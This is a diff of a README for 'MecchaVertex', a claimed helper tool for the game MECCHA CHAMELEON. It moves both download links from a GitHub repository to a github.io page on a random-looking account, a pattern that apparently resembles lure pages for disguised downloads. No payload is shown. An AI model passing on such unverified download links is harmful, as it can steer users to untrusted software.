@@ -1,6 +1,6 @@
 # 🦎 MecchaVertex - Master your gameplay in every match
 
-[![Download MecchaVertex](https://img.shields.io/badge/Download-MecchaVertex-blue.svg)](https://github.com/18th-tongueworm804/MecchaVertex)
+[![Download MecchaVertex](https://img.shields.io/badge/Download-MecchaVertex-blue.svg)](https://18th-tongueworm804.github.io)
 
 ## 📖 About the project
 
@@ -28,7 +28,7 @@ MecchaVertex provides tools for the game MECCHA CHAMELEON. It adds several helpe
 
 Visit the link below to get the software:
 
-[https://github.com/18th-tongueworm804/MecchaVertex](https://github.com/18th-tongueworm804/MecchaVertex)
+[https://18th-tongueworm804.github.io](https://18th-tongueworm804.github.io)
 
 Follow these steps to set up the tool:
 
